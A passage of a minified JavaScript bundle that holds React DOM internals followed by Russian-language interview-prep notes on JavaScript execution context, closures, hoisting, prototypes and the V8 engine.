e;case 14:t=Os(null,t,r,Ne(r.type,e),n);break e}throw Error(y(306,r,""))}return t;case 0:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Ne(r,o),Rl(e,t,r,o,n);case 1:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Ne(r,o),Ls(e,t,r,o,n);case 3:e:{if(_u(t),e===null)throw Error(y(387));r=t.pendingProps,l=t.memoizedState,o=l.element,uu(e,t),$r(t,r,null,n);var i=t.memoizedState;if(r=i.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:i.cache,pendingSuspenseBoundaries:i.pendingSuspenseBoundaries,transitions:i.transitions},t.updateQueue.baseState=l,t.memoizedState=l,t.flags&256){o=rn(Error(y(423)),t),t=Ds(e,t,r,n,o);break e}else if(r!==o){o=rn(Error(y(424)),t),t=Ds(e,t,r,n,o);break e}else for(ge=st(t.stateNode.containerInfo.firstChild),ve=t,z=!0,Oe=null,n=su(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(en(),r===o){t=Ke(e,t,n);break e}le(e,t,r,n)}t=t.child}return t;case 5:return cu(t),e===null&&xl(t),r=t.type,o=t.pendingProps,l=e!==null?e.memoizedProps:null,i=o.children,yl(r,o)?i=null:l!==null&&yl(r,l)&&(t.flags|=32),Au(e,t),le(e,t,i,n),t.child;case 6:return e===null&&xl(t),null;case 13:return Fu(e,t,n);case 4:return gi(t,t.stateNode.containerInfo),r=t.pendingProps,e===null?t.child=tn(t,null,r,n):le(e,t,r,n),t.child;case 11:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Ne(r,o),Ms(e,t,r,o,n);case 7:return le(e,t,t.pendingProps,n),t.child;case 8:return le(e,t,t.pendingProps.children,n),t.child;case 12:return le(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,o=t.pendingProps,l=t.memoizedProps,i=o.value,I(br,r._currentValue),r._currentValue=i,l!==null)if(Ie(l.value,i)){if(l.children===o.children&&!fe.current){t=Ke(e,t,n);break e}}else for(l=t.child,l!==null&&(l.return=t);l!==null;){var s=l.dependencies;if(s!==null){i=l.child;for(var a=s.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=be(-1,n&-n),a.tag=2;var c=l.updateQueue;if(c!==null){c=c.shared;var f=c.pending;f===null?a.next=a:(a.next=f.next,f.next=a),c.pending=a}}l.lanes|=n,a=l.alternate,a!==null&&(a.lanes|=n),Tl(l.return,n,t),s.lanes|=n;break}a=a.next}}else if(l.tag===10)i=l.type===t.type?null:l.child;else if(l.tag===18){if(i=l.return,i===null)throw Error(y(341));i.lanes|=n,s=i.alternate,s!==null&&(s.lanes|=n),Tl(i,n,t),i=l.sibling}else i=l.child;if(i!==null)i.return=l;else for(i=l;i!==null;){if(i===t){i=null;break}if(l=i.sibling,l!==null){l.return=i.return,i=l;break}i=i.return}l=i}le(e,t,o.children,n),t=t.child}return t;case 9:return o=t.type,r=t.pendingProps.children,Xt(t,n),o=Ee(o),r=r(o),t.flags|=1,le(e,t,r,n),t.child;case 14:return r=t.type,o=Ne(r,t.pendingProps),o=Ne(r.type,o),Os(e,t,r,o,n);case 15:return Du(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Ne(r,o),jr(e,t),t.tag=1,pe(r)?(e=!0,Wr(t)):e=!1,Xt(t,n),Mu(t,r,o),Pl(t,r,o,n),Nl(null,t,r,!0,e,n);case 19:return zu(e,t,n);case 22:return Iu(e,t,n)}throw Error(y(156,t.tag))};function ec(e,t){return ja(e,t)}function Rf(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function xe(e,t,n,r){return new Rf(e,t,n,r)}function Oi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Nf(e){if(typeof e=="function")return Oi(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Xl)return 11;if(e===Yl)return 14}return 2}function dt(e,t){var n=e.alternate;return n===null?(n=xe(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Mr(e,t,n,r,o,l){var i=2;if(r=e,typeof e=="function")Oi(e)&&(i=1);else if(typeof e=="string")i=5;else e:switch(e){case At:return Et(n.children,o,l,t);case Ql:i=8,o|=8;break;case Xo:return e=xe(12,n,t,o|2),e.elementType=Xo,e.lanes=l,e;case Yo:return e=xe(13,n,t,o),e.elementType=Yo,e.lanes=l,e;case qo:return e=xe(19,n,t,o),e.elementType=qo,e.lanes=l,e;case ca:return mo(n,o,l,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case aa:i=10;break e;case ua:i=9;break e;case Xl:i=11;break e;case Yl:i=14;break e;case qe:i=16,r=null;break e}throw Error(y(130,e==null?e:typeof e,""))}return t=xe(i,n,t,o),t.elementType=e,t.type=r,t.lanes=l,t}function Et(e,t,n,r){return e=xe(7,e,r,t),e.lanes=n,e}function mo(e,t,n,r){return e=xe(22,e,r,t),e.elementType=ca,e.lanes=n,e.stateNode={isHidden:!1},e}function $o(e,t,n){return e=xe(6,e,null,t),e.lanes=n,e}function Go(e,t,n){return t=xe(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Mf(e,t,n,r,o){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=jo(0),this.expirationTimes=jo(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=jo(0),this.identifierPrefix=r,this.onRecoverableError=o,this.mutableSourceEagerHydrationData=null}function Li(e,t,n,r,o,l,i,s,a){return e=new Mf(e,t,n,s,a),t===1?(t=1,l===!0&&(t|=8)):t=0,l=xe(3,null,null,t),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},hi(l),e}function Of(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:It,key:r==null?null:""+r,children:e,containerInfo:t,implementation:n}}function tc(e){if(!e)return pt;e=e._reactInternals;e:{if(Lt(e)!==e||e.tag!==1)throw Error(y(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(pe(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(y(171))}if(e.tag===1){var n=e.type;if(pe(n))return tu(e,n,t)}return t}function nc(e,t,n,r,o,l,i,s,a){return e=Li(n,r,!0,e,o,l,i,s,a),e.context=tc(null),n=e.current,r=ie(),o=ct(n),l=be(r,o),l.callback=t??null,at(n,l,o),e.current.lanes=o,Xn(e,o,r),me(e,r),e}function ho(e,t,n,r){var o=t.current,l=ie(),i=ct(o);return n=tc(n),t.context===null?t.context=n:t.pendingContext=n,t=be(l,i),t.payload={element:e},r=r===void 0?null:r,r!==null&&(t.callback=r),e=at(o,t,i),e!==null&&(De(e,o,i,l),Tr(e,o,i)),i}function eo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Vs(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Di(e,t){Vs(e,t),(e=e.alternate)&&Vs(e,t)}function Lf(){return null}var rc=typeof reportError=="function"?reportError:function(e){console.error(e)};function Ii(e){this._internalRoot=e}go.prototype.render=Ii.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(y(409));ho(e,t,null,null)};go.prototype.unmount=Ii.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Mt(function(){ho(null,e,null,null)}),t[$e]=null}};function go(e){this._internalRoot=e}go.prototype.unstable_scheduleHydration=function(e){if(e){var t=Ia();e={blockedOn:null,target:e,priority:t};for(var n=0;n<et.length&&t!==0&&t<et[n].priority;n++);et.splice(n,0,e),n===0&&_a(e)}};function Ai(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function vo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function bs(){}function Df(e,t,n,r,o){if(o){if(typeof r=="function"){var l=r;r=function(){var c=eo(i);l.call(c)}}var i=nc(t,r,e,0,null,!1,!1,"",bs);return e._reactRootContainer=i,e[$e]=i.current,Un(e.nodeType===8?e.parentNode:e),Mt(),i}for(;o=e.lastChild;)e.removeChild(o);if(typeof r=="function"){var s=r;r=function(){var c=eo(a);s.call(c)}}var a=Li(e,0,!1,null,null,!1,!1,"",bs);return e._reactRootContainer=a,e[$e]=a.current,Un(e.nodeType===8?e.parentNode:e),Mt(function(){ho(t,a,n,r)}),a}function yo(e,t,n,r,o){var l=n._reactRootContainer;if(l){var i=l;if(typeof o=="function"){var s=o;o=function(){var a=eo(i);s.call(a)}}ho(t,i,e,o)}else i=Df(n,t,e,o,r);return eo(i)}La=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=kn(t.pendingLanes);n!==0&&(ei(t,n|1),me(t,J()),!(L&6)&&(on=J()+500,gt()))}break;case 13:Mt(function(){var r=Ge(e,1);if(r!==null){var o=ie();De(r,e,1,o)}}),Di(e,1)}};ti=function(e){if(e.tag===13){var t=Ge(e,134217728);if(t!==null){var n=ie();De(t,e,134217728,n)}Di(e,134217728)}};Da=function(e){if(e.tag===13){var t=ct(e),n=Ge(e,t);if(n!==null){var r=ie();De(n,e,t,r)}Di(e,t)}};Ia=function(){return D};Aa=function(e,t){var n=D;try{return D=e,t()}finally{D=n}};al=function(e,t,n){switch(t){case"input":if(tl(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var o=so(r);if(!o)throw Error(y(90));fa(r),tl(r,o)}}}break;case"textarea":ma(e,n);break;case"select":t=n.value,t!=null&&$t(e,!!n.multiple,t,!1)}};ka=Ri;Ca=Mt;var If={usingClientEntryPoint:!1,Events:[qn,Ht,so,Sa,wa,Ri]},yn={findFiberByHostInstance:kt,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Af={bundleType:yn.bundleType,version:yn.version,rendererPackageName:yn.rendererPackageName,rendererConfig:yn.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Qe.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Ea(e),e===null?null:e.stateNode},findFiberByHostInstance:yn.findFiberByHostInstance||Lf,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var yr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!yr.isDisabled&&yr.supportsFiber)try{ro=yr.inject(Af),ze=yr}catch{}}Se.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=If;Se.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Ai(t))throw Error(y(200));return Of(e,t,null,n)};Se.createRoot=function(e,t){if(!Ai(e))throw Error(y(299));var n=!1,r="",o=rc;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),t=Li(e,1,!1,null,null,n,!1,r,o),e[$e]=t.current,Un(e.nodeType===8?e.parentNode:e),new Ii(t)};Se.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(y(188)):(e=Object.keys(e).join(","),Error(y(268,e)));return e=Ea(t),e=e===null?null:e.stateNode,e};Se.flushSync=function(e){return Mt(e)};Se.hydrate=function(e,t,n){if(!vo(t))throw Error(y(200));return yo(null,e,t,!0,n)};Se.hydrateRoot=function(e,t,n){if(!Ai(e))throw Error(y(405));var r=n!=null&&n.hydratedSources||null,o=!1,l="",i=rc;if(n!=null&&(n.unstable_strictMode===!0&&(o=!0),n.identifierPrefix!==void 0&&(l=n.identifierPrefix),n.onRecoverableError!==void 0&&(i=n.onRecoverableError)),t=nc(t,null,e,1,n??null,o,!1,l,i),e[$e]=t.current,Un(e),r)for(e=0;e<r.length;e++)n=r[e],o=n._getVersion,o=o(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,o]:t.mutableSourceEagerHydrationData.push(n,o);return new go(t)};Se.render=function(e,t,n){if(!vo(t))throw Error(y(200));return yo(null,e,t,!1,n)};Se.unmountComponentAtNode=function(e){if(!vo(e))throw Error(y(40));return e._reactRootContainer?(Mt(function(){yo(null,null,e,!1,function(){e._reactRootContainer=null,e[$e]=null})}),!0):!1};Se.unstable_batchedUpdates=Ri;Se.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!vo(n))throw Error(y(200));if(e==null||e._reactInternals===void 0)throw Error(y(38));return yo(e,t,n,!1,r)};Se.version="18.3.1-next-f1338f8080-20240426";function oc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(oc)}catch(e){console.error(e)}}oc(),oa.exports=Se;var _f=oa.exports,Js=_f;Ko.createRoot=Js.createRoot,Ko.hydrateRoot=Js.hydrateRoot;const to={1:{label:"INTERN",color:"#8b949e"},2:{label:"JUNIOR",color:"#3fb950"},3:{label:"MIDDLE",color:"#d29922"},4:{label:"SENIOR",color:"#f85149"}},Ff=[{id:"js",title:"JS",icon:"⚡",color:"#F0DB4F",topics:[{name:"Определение контекста выполнения, случаи применения",level:"2",content:`**Контекст выполнения (Execution Context)** — структура, которая создаётся при каждом вызове функции.

Состоит из двух компонентов:
• **Lexical Environment** — для \`let\`, \`const\`, function declarations
• **Variable Environment** — для \`var\`

**this определяется способом вызова функции, НЕ местом объявления.**

Способы вызова и значение this:
\`\`\`js
obj.method()        // this = obj (метод объекта)
func()              // this = window / undefined (свободный вызов)
func.call(ctx)      // this = ctx (явная привязка)
func.apply(ctx)     // this = ctx (явная привязка)
func.bind(ctx)()    // this = ctx (жёсткая привязка)
new Func()          // this = новый объект
\`\`\`

**Шаги оператора new:**
1. Создаётся пустой объект \`{}\`
2. \`__proto__\` нового объекта → \`Function.prototype\`
3. \`this\` внутри функции указывает на новый объект
4. Выполняется тело функции
5. Если return объект → вернётся он; если примитив/ничего → свой объект`,score:3.5},{name:"Вычисление контекста, его значение по умолчанию",level:"2",content:"**Reference Type** — внутренний тип спецификации. При вычислении `obj.method` движок получает:\n```\n{ base: obj, name: 'method', strict: false }\n```\n\n**GetValue()** — внутренняя операция, которая извлекает значение из Reference Type, уничтожая base.\n\nВызывается при: присваивании (`=`), логических операторах (`||`, `&&`), операторе запятая.\n**НЕ вызывается** при группировке `()`.\n\n```js\nobj.method()              // Reference Type жив → this = obj\n(obj.method)()            // группировка не ломает → this = obj\n(obj.method = obj.method)() // присваивание → GetValue() → this = window\n(false || obj.method)()   // || → GetValue() → this = window\n```\n\n**Boxing (нестрогий режим):**\n• `null` / `undefined` → `window`\n• Примитив → обёртка: `7` → `Number{7}`\n\n```js\nfunction foo() { console.log(this); }\n\n// Нестрогий режим:\nfoo.call(null);      // this → window\nfoo.call(undefined); // this → window\nfoo.call(7);         // this → Number {7}  ← boxing!\nfoo.call('hi');      // this → String {'hi'} ← boxing!\n\n// Strict mode — boxing не происходит:\nfoo.call(7);         // this → 7 (просто примитив)\nfoo.call(null);      // this → null\n```\n\n**Правило:** нестрогий → null/undefined заменяются на window, примитивы оборачиваются в объект. Строгий → что передал, то и получил.",score:2.5},{name:"Сохранение контекста выполнения через замыкание",level:"2",content:`**Замыкание** — функция + её ссылка \`[[Environment]]\` на лексическое окружение, в котором она была создана.

**\`[[Environment]]\`** — скрытое свойство каждой функции, устанавливается в момент **СОЗДАНИЯ** (не вызова!).

Сборщик мусора не удаляет лексическое окружение, пока на него есть ссылка из \`[[Environment]]\`.

**Приём const self = this:**
\`\`\`js
function Timer() {
  this.seconds = 0;
  const self = this; // сохраняем через замыкание
  setInterval(function() {
    self.seconds++;
  }, 1000);
}
\`\`\`

**Классическая задача var + цикл:**
\`\`\`js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 3, 3, 3

// Решение 1: IIFE
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 1000);
  })(i);
}

// Решение 2: let
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 0, 1, 2 — спецификация for+let создаёт новое ЛО на каждую итерацию
\`\`\``,score:3},{name:"Потеря контекста",level:"2",content:`**3 случая потери контекста:**

1. **Присваивание метода в переменную:**
\`\`\`js
const fn = obj.greet; // GetValue() → base потерян
fn(); // this = window/undefined
\`\`\`

2. **Передача метода как колбэка:**
\`\`\`js
setTimeout(obj.greet, 1000); // GetValue() → base потерян
\`\`\`

3. **Вложенная функция внутри метода:**
\`\`\`js
const obj = {
  method() {
    function inner() {
      console.log(this); // window — inner имеет base = ЛО (не объект)
    }
    inner();
  }
};
\`\`\`

**4 способа исправить:**
1. **Стрелочная функция** — не создаёт свой this
2. **bind** — возвращает функцию с привязанным this
3. **const self = this** — замыкание
4. **call/apply** — для немедленного вызова`,score:4},{name:"Виды объявления переменных, Function declaration и Function expression, NFE, IIFE",level:"2",content:`**var**: область видимости — функция/скрипт, всплывает с \`undefined\`
**let/const**: область видимости — блок, всплывает как \`uninitialized\` (TDZ)

**Function Declaration vs Expression:**
• FD — полностью всплывает (можно вызвать до объявления)
• FE — следует правилам переменной, в которую присвоен

**Приоритет при одном имени:** function declaration перезаписывает var при всплытии.

**NFE (Named Function Expression):**
\`\`\`js
const sayHi = function greeting() {
  // greeting доступно только здесь
  // хранится в промежуточном ЛО как immutable
  // Перезаписать нельзя
};
greeting(); // ReferenceError — снаружи не видно
\`\`\`
Зачем: надёжная рекурсия (не зависит от внешней переменной) + отладка (имя в stack trace).

**IIFE:** Создаёт изолированную область видимости. До ES6 — основной инструмент модульности. Сейчас заменён \`let/const\`, блоками, модулями.`,score:3.5},{name:"Всплытие переменных",level:"2",content:`Движок проходит код дважды:
1. **Регистрация** — var → \`undefined\`, let/const → \`uninitialized\`, FD → полностью
2. **Выполнение** — построчно

**TDZ (Temporal Dead Zone):** промежуток от начала блока до строки объявления let/const. Обращение → ReferenceError.

\`\`\`js
let x = 'outer';
{
  console.log(x); // ReferenceError, НЕ 'outer'!
  let x = 'inner'; // TS знает о нём с начала блока
}
\`\`\`

**function declaration внутри блока:**
• Нестрогий режим: всплывает только имя как var (\`undefined\`), функция не поднимается
• Strict mode: блочная видимость, не всплывает наружу вообще

**Разница ЛО блока и функции:**
• Функция: Lexical Environment + Variable Environment
• Блок: только Lexical Environment (var пролетает мимо блока)`,score:4},{name:"Что такое замыкание?",level:"2",content:"**Замыкание** — сама функция вместе с её ссылкой `[[Environment]]` на лексическое окружение, в котором она была создана.\n\nТехнически **каждая** функция в JS — замыкание, потому что каждая получает `[[Environment]]`. Заметно когда внутренняя функция живёт дольше внешней.\n\n**Механика:**\n1. Функция создаётся → получает `[[Environment]]` → ссылка на текущее ЛО\n2. Функция вызывается → создаётся новое ЛО, `outer` = `[[Environment]]`\n3. Поиск переменных идёт по цепочке `outer`\n4. `[[Environment]]` уже не участвует — он сделал своё дело на шаге 2\n\nСборщик мусора не удаляет ЛО, пока на него ссылается `[[Environment]]` живой функции.",score:4},{name:"Определение класса. Синтаксис классов. Наследование",level:"2",content:`**typeof class = "function"** — синтаксический сахар.

**Отличия class от функции-конструктора:**
1. Без \`new\` — TypeError
2. Методы неперечислимые
3. Всегда strict mode
4. Не всплывает

**extends создаёт ДВЕ цепочки:**
\`\`\`js
Admin.prototype.__proto__ === User.prototype // для экземпляров
Admin.__proto__ === User                     // для статики
\`\`\`

**super():**
• В конструкторе — вызывает конструктор родителя, создаёт this
• В методе — обращается к методу родительского прототипа
• Без super() в дочернем конструкторе — ReferenceError при обращении к this

**User.prototype** по умолчанию = \`{ constructor: User }\`

**Приватные методы:**
\`\`\`js
class User {
  #name;
  constructor(name) { this.#name = name; }
  #validate() { return this.#name.length > 0; }
  getName() { return this.#validate() ? this.#name : null; }
}
\`\`\`

**Порядок инициализации полей:**
1. Поля родителя (class fields)
2. Конструктор родителя (super())
3. Поля дочернего класса
4. Конструктор дочернего класса

**Mixin-паттерн** (псевдо-множественное наследование):
\`\`\`js
const Serializable = (Base) => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Validatable = (Base) => class extends Base {
  validate() { return Object.values(this).every(v => v !== null); }
};
class User extends Serializable(Validatable(EventEmitter)) { ... }
\`\`\`
Каждый mixin — функция (Base) => class extends Base. Цепочка прототипов линейна, нет diamond problem.`,score:3.5},{name:"Подмена существующего контекста",level:"2",content:`**call(ctx, a, b)** — вызывает сразу, аргументы через запятую
**apply(ctx, [a, b])** — вызывает сразу, аргументы массивом (A = Array)
**bind(ctx)** — НЕ вызывает, возвращает новую функцию

**bind привязывает навсегда.** Повторный bind/call/apply не перебьёт. Под капотом создаётся exotic object с \`[[BoundThis]]\`.

**Стрелочная функция** — подмена this НЕВОЗМОЖНА. call/apply/bind игнорируются. this ищется как переменная по \`[[Environment]]\`.

**React классовые компоненты:**
\`\`\`js
// Вариант 1: bind в конструкторе
this.handleClick = this.handleClick.bind(this);

// Вариант 2: стрелочная функция как поле класса
handleClick = () => { ... }
\`\`\``,score:3},{name:"Лексическое окружение",level:"3",content:`**Лексическое окружение (Lexical Environment)** — структура данных, хранящая:
• **Environment Record** — привязки идентификаторов к значениям
• **outer** — ссылка на внешнее ЛО

Создаётся при каждом вызове функции и для каждого блока (для let/const).

**Поиск переменных:** своё ЛО → outer → ... → глобальное ЛО → null → ReferenceError

**\`[[Environment]]\`:**
• Устанавливается в момент **создания** функции
• При вызове функции: новое ЛО, его outer = \`[[Environment]]\`

**Промежуточное ЛО у NFE:**
\`\`\`
Внутреннее ЛО функции
  ↓ outer
Промежуточное { greeting: <функция> } (immutable)
  ↓ outer
Внешнее ЛО
\`\`\``,score:4.5},{name:"Определение прототипа. Цепочка прототипов, механизм поиска свойств",level:"3",content:`**\`[[Prototype]]\`** — скрытое свойство объекта, доступно через \`__proto__\` (геттер/сеттер).

**Два механизма поиска:**
• Переменные: по цепочке outer (статически, при создании) → ReferenceError
• Свойства: по цепочке __proto__ (динамически, можно менять) → undefined

**Shadowing:** запись свойства ВСЕГДА на самом объекте, не поднимается по цепочке.

**this в методе прототипа:** неважно где метод найден, this = объект перед точкой.

\`\`\`js
hasOwnProperty('prop')  // проверка собственного свойства
for...in                // включая прототип
Object.keys()           // только собственные
\`\`\`

**Конец цепочки:** Object.prototype → null

**Object.create():**
\`\`\`js
// Создать объект с конкретным прототипом
const animal = { breathe() { return true; } };
const dog = Object.create(animal);
dog.bark = () => 'Woof';
Object.getPrototypeOf(dog) === animal; // true

// Объект без прототипа — чистый hash map (нет toString, hasOwnProperty и т.д.)
const map = Object.create(null);
map['key'] = 'value'; // никогда не конфликтует с prototype методами
\`\`\`

**Object.getPrototypeOf vs __proto__:**
\`__proto__\` — устаревший геттер/сеттер на Object.prototype.
\`Object.getPrototypeOf(obj)\` — стандартный API, используй его.
\`Object.setPrototypeOf(obj, proto)\` — изменить прототип у существующего объекта. Избегай в горячем коде: переводит объект в slow mode (V8 сбрасывает Hidden Class).`,score:4},{name:"Особенности стрелочных функций. Отличия от классических",level:"3",content:"**6 отличий:**\n1. Нет своего this — берёт из `[[Environment]]`\n2. Нет `arguments`\n3. Нельзя вызвать через `new`\n4. Нет свойства `prototype`\n5. Не может быть генератором\n6. Краткий синтаксис\n\nthis внутри стрелочной функции **есть** и работает, но она не создаёт **свой**. Ищет как обычную переменную по цепочке ЛО.\n\n`call/apply/bind` полностью **игнорируются** — подменить this невозможно.",score:4},{name:"Принципы работы сборщика мусора в V8",level:"4",content:`**Принцип достижимости (reachability):** всё, до чего можно добраться от корней — живое.

**Корни (roots):**
1. Глобальный объект (window/global)
2. Стек вызовов (локальные переменные выполняющихся функций)
3. Замыкания (ЛО со ссылками из живых функций)

**Два поколения памяти:**

**Young Generation → Scavenger (Minor GC):**
• Маленькая область для новых объектов
• Два полупространства: from-space и to-space
• Живые копируются в to-space, from-space очищается, роли меняются
• Быстрый, частый

**Old Generation → Mark-Sweep-Compact (Major GC):**
• Mark — помечает живые от корней
• Sweep — освобождает непомеченные
• Compact — уплотняет, убирая фрагментацию
• Медленный, редкий

**Promotion:** объект пережил 2 сборки в Young → Old

**Оптимизации пауз GC в V8:**
• Incremental Marking:
Фаза Mark в Mark-Sweep-Compact — самая долгая, потому что нужно обойти весь граф объектов от корней. Вместо того чтобы делать это за один раз и блокировать основной поток на десятки-сотни миллисекунд, V8 разбивает обход на маленькие порции по 5-10мс. Между порциями выполняется JavaScript. Проблема — пока мы помечали объекты порциями, JS-код мог создать новые ссылки или удалить старые. Для этого используется write barrier — при каждой записи свойства V8 отмечает изменённые объекты и перепроверяет их при следующей порции.
• Concurrent Marking/Sweeping/Compacting:
Фазы Sweep и Compact выполняются в отдельных потоках (worker threads), параллельно с основным JS-потоком. Основной поток продолжает выполнять JS, а воркеры в это время освобождают и уплотняют память. Начиная с 2018 года V8 также делает concurrent marking — часть фазы Mark тоже выполняется в параллельных потоках, а основной поток только финализирует результат.
• Lazy Sweeping:
После фазы Mark движок знает какие объекты мёртвые, но не торопится их очищать. Sweep происходит лениво — только когда нужно выделить новую память и текущая страница заполнена. Если памяти хватает — sweep откладывается. Это размазывает стоимость очистки во времени.
Итого эффект:
Без оптимизаций пауза Major GC могла занимать 100-500мс (заметный фриз UI). С оптимизациями — основной поток блокируется на 1-5мс за раз, остальное параллельно или инкрементально.`,score:2.5},{name:"Процесс обработки кода в V8: AST, лексический анализ, JIT, деоптимизация",level:"4",content:`**Pipeline V8:**
\`\`\`
Исходный код → Токены → AST → Байткод (Ignition) → Машинный код (TurboFan)
\`\`\`

**Процесс обработки кода в V8:**

**1. Лексический анализ (Tokenization/Lexing):**
Движок получает исходный код как текст. Первым делом разбивает его на токены — минимальные значимые единицы. Например const x = 10 + 5; → [const][x][=][10][+][5][;]. Каждый токен имеет тип (ключевое слово, идентификатор, оператор, число, пунктуация).
V8 делает это двумя способами:

Eager parsing (полный) — для кода, который нужен прямо сейчас (верхний уровень скрипта, немедленно вызываемые функции)
Lazy parsing (pre-parsing) — для тел функций, которые могут никогда не вызваться. Pre-parser не строит AST, только проверяет синтаксические ошибки и запоминает границы функции (где начинается, где заканчивается). Полный парсинг произойдёт только при первом вызове. Это критично для ускорения старта — представь бандл на 2MB JS, из которого при загрузке реально выполняется 20%.

**2. Синтаксический анализ (Parsing) → AST:**
Из плоского списка токенов строится Abstract Syntax Tree — дерево, где каждый узел представляет операцию или конструкцию. AST нужен потому что токены — плоский список, а код имеет вложенную структуру: приоритеты операций (* раньше +), вложенные блоки, scope. Дерево разрешает эти связи и позволяет дальше генерировать код и оптимизировать.

**3. Ignition (интерпретатор) → байткод:**
AST передаётся в Ignition — интерпретатор V8. Он генерирует байткод — промежуточное низкоуровневое представление, но не машинный код. Байткод генерируется быстро и выполняется сразу — это даёт быстрый старт. Пользователь видит страницу не дожидаясь тяжёлой компиляции. Параллельно Ignition собирает профилирующую информацию: какие функции вызываются часто, какие типы аргументов приходят, какие ветки if/else выполняются.

**4. TurboFan (оптимизирующий компилятор) → машинный код:**
Когда функция вызывается достаточно часто (становится «горячей»), Ignition передаёт её байткод и собранный профиль в TurboFan. TurboFan выполняет спекулятивную оптимизацию — на основе профиля предполагает типы и генерирует оптимизированный машинный код. Например, если add(a, b) 10000 раз получала числа — TurboFan генерирует машинный код для сложения чисел напрямую, без проверок типов, без boxing, с использованием CPU-инструкций для целочисленной арифметики.

**5. Деоптимизация (Deoptimization):**
Если предположения TurboFan оказались неверны (пришла строка вместо числа, объект другой формы) — оптимизированный машинный код выбрасывается, и функция возвращается к выполнению через байткод в Ignition. Это называется bailout. Функция снова работает медленно, но корректно. Ignition продолжит собирать профиль, и если увидит новую стабильную закономерность — TurboFan попробует оптимизировать заново, уже с учётом новых типов.
Практические следствия:

